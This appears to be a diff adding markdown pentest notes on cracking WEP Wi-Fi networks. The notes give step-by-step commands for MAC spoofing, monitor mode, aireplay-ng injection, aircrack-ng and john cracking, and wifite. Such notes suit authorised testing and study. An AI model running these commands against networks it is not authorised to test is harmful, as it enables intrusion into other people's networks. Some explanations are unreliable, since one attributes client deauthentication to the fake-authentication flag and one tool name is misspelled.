@@ -1,0 +1,76 @@
+It can be a good idea to change our MAC address, this can be done by typing:
+```sh
+ifconfig wlan0 down
+ifconfig wlan0 hw ether aa:bb:cc:dd:ee:ff
+ifconfig wlan0 up
+```
+
+We may also use more advanced tools such as `macchanger`.
+
+Then we have to set the WNIC in monitor mode by doing:
+```sh
+ifconfig wlan0 down
+airmon-ng start wlan0
+ifconfig wlan0 up
+iwconfig # check if the interface is in monitor mode
+```
+### WEP cracking with aircrack-ng
+
+Now we can search of access point by doing:
+```sh
+airodump-ng wlan0mon
+```
+
+Now we know the channel, the MAC adddress and some of the stations connected.
+
+```sh
+airodump --channel <channel> --bssid <bssid> --write filenameprefix wlan0mon
+```
+
+Now we will send a fake authentication packet pretending to be one of the
+clients.
+
+If there is no client connected we want to use aireplay-ng with `-1`
+```sh
+aireplay-ng -1 0 -e <ESSID> -a <access_point_mac> -h <station_mac> wlan0mon
+```
+
+In this way we kicked the `station_mac` client off and captured the reconnection
+of the station to the AP.
+
+If there is at leaast a client connected we can use that client MAC address and
+use aireplay-ng with `-3` which is a classic attack. 
+
+So we can do:
+```sh
+aireplay-ng -3 -b <access_point_mac> -h <station_mac> wlan0mon
+```
+
+While the process is going we can start the cracking process by doing:
+```sh
+aircrack-ng --new-session <cap_file>.session -b <bssid_ap> <filename.cap>
+```
+We may restore the cracking session by doing:
+```sh
+aircrack-ng --restore-session <cap_file>.session
+```
+On some versions this may not work and we should help us with john by doing:
+```sh
+john --session=foo --stdout --wordlist=wordlist.dic | aircrack-ng -w - -b <target_mac> file.cap
+```
+And restore it with:
+```sh
+john --restore=foo | aircrack-ng -w - -b <target_mac> file.cap
+```
+
+We generally need from 10k IVs to 250k 
+
+### WEP cracking with wifite
+
+We just do:
+```sh
+wifite
+```
+we then press ctrl+c and then we choose the number associated to the target AP 
+we want to attack.
+It will just do everything automatically.
